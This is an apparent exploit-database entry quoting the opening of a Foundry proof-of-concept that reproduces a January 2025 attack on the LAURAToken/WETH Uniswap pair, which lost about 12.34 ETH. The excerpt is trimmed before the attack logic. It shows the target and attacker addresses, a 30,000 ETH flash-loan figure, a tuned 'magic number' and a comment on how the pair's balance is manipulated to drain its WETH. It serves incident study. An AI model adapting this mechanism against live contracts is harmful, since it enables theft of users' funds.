# [?] LAURAToken - Pair Balance Manipulation

## Summary
Severity: Unknown
Chain: Ethereum
Component: LAURAToken
Published: 2025-01-01
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/LAURAToken_exp.sol
Type: defi-exploit-poc

## Details
Lost: 12.34 ETH (~$41.2K USD)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../interface.sol";

// Happy New Year
// @KeyInfo - Total Lost : 12.340357077284305206 ETH (~$41.2K USD)
// Attacker : https://etherscan.io/address/0x25869347f7993c50410a9b9b9c48f37d79e12a36
// Attack Contract 0 : https://etherscan.io/address/0x2cad84c3d2e31bc6d630229901f421e6da5557ef
// Attack Contract 1 : https://etherscan.io/address/0x55877cf2f24286dba2acb64311beca39728fbd10
// Vulnerable Contract : https://etherscan.io/token/0x05641e33fd15baf819729df55500b07b82eb8e89
// Attack Tx : https://etherscan.io/tx/0xef34f4fdf03e403e3c94e96539354fb4fe0b79a5ec927eacc63bc04108dbf420
// @POC Author : [rotcivegaf](https://twitter.com/rotcivegaf)

// Contracts involved
address constant uniV2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant pairLAURA_WETH = 0xb292678438245Ec863F9FEa64AFfcEA887144240;
address constant balancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
uint256 constant LOAN_AMOUNT = 30000 ether;

// This amount is used when calling `swapExactTokensForTokensSupportingFeeOnTransferTokens` and `addLiquidity` 
// from the uniV2Router
// It is enough so that when the `removeLiquidityWhenKIncreases` function of the LAURA contract is called,
// the LAURA balance of the WETH/LAURA pair will go down enough to be able to steal all the WETH from the pair
uint256 constant MAGIC_NUMBER = 11526249223479392795400;

contract LAURAToken_exp is Test {
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork("mainnet", 21_529_888 - 1);
    }

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/LAURAToken_exp.sol_
